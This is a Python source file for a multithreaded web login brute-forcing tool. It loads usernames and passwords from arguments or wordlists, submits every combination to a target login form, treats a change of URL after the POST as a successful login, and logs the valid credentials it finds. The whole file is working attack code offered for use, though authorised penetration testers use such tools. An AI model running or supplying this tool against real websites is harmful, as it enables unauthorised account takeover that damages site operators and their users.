#!/bin/python
import requests
import threading
from args_parser import parser
from logger import logger as log
from time import sleep
import utils

verbosity = True
args = parser.parse_args()  # argument parser set up in ./args_parser.py

# setting verbbosity and checking if the user wants to use a wordlist or not
if (args.login is None and args.login_file is None):
    parser.error('you must specify a login or a login file')
if (args.password is None and args.password_file is None):
    parser.error('you must specify a password or a password file')
if (args.quiet):
    verbosity = False

# loading username and password in python Lists whether they are single or wordlists
username_list = []
password_list = []
if (args.login is not None):
    username_list = [args.login]
if (args.login_file is not None):
    with open(args.login_file, 'r') as f:
        username_list = f.read().splitlines()
if (args.password is not None):
    password_list = [args.password]
if (args.password_file is not None):
    with open(args.password_file, 'r') as f:
        password_list = f.read().splitlines()


# the function that will be used to test the login it is pretty straight forward, it just sends a request to the website
# and checks if the website redirects to a page (i.e dashbord.php, home...)) in other words if the request url changed
# if so, it means that the login was successful
def brute_force(username, password, success_page=None):
    success = False
    session = requests.Session()
    payload = {args.login_param_name: username,
               args.password_param_name: password}
    post_req = session.post(args.url, data=payload)
    # -------------------------------------------------------------------------------------------------------------------- 
    # here is were i define checks to see if the login was successful or not, and that does not need a failure message
    # i will add more conditions to check wether the login was successful or not    
    # as i come accross them and that are not explicit countrary to the usual "incorrect password" etc...   
    # if you have any other conditions to check that would indicate if the login was successful or not you can add them 
    # --------------------------------------------------------------------------------------------------------------------
    if (success_page) and (args.url == success_page):
        success = True
    elif (args.url != post_req.url) :
        success = True
    # set success to true if one of the above conditions validated, otherwise log that the username/password combination is not valid
    else :
        if (verbosity):
            log.fail(f"{username}:{password} is not a valid login")
        session.close()
        sleep(args.wait)
        
    # if success is set to true, we log the combination as valid 
    if success :
        log.info(
            f"found a valid username and password {username}:{password}", bold=True, underline=True)
        # killing all threads before exiting
        for thread in threading.enumerate():
            if thread is not threading.current_thread():
                thread.join()
        
        exit(0)
        


def main():
    if (verbosity):
        log.header(f"starting brute force with {args.threads} threads")
    
    success, message = None, None
    
    for i in range(5):
        success, message = utils.try_connection(args.url, follow_redirects=args.follow_redirects).values()
        if success: break
        log.error(message)
        sleep(args.wait)
        if i == 4 :
            log.error("could not establish a connection to the target, exiting...")
            exit(1)
        

    if success:
        if verbosity:
            log.okblue("connection successful")
    for username in username_list:
        for password in password_list:
            t = threading.Thread(target=brute_force, args=(username, password))
            t.start()
            # this infinite loop will run if the count of the active threads is higher than the threads allowed by the user to stop creation of new threads
            # once this number of active threads goes down, we exit from the loop and we can start new threads
            while threading.active_count() > args.threads + 1:
                print(threading.active_count())
                pass

    while all([th.is_alive() for th in threading.enumerate()]):
        pass  # waiting for all the threads to finish to log that no valid credentials were found

                          
    log.error("no valid credentials were found") # if the program arrives here it means that no valid credentials were found
                                                 # because if found, the program would have exited


if __name__ == "__main__":
    if (verbosity):
        utils.print_banner()
    main()
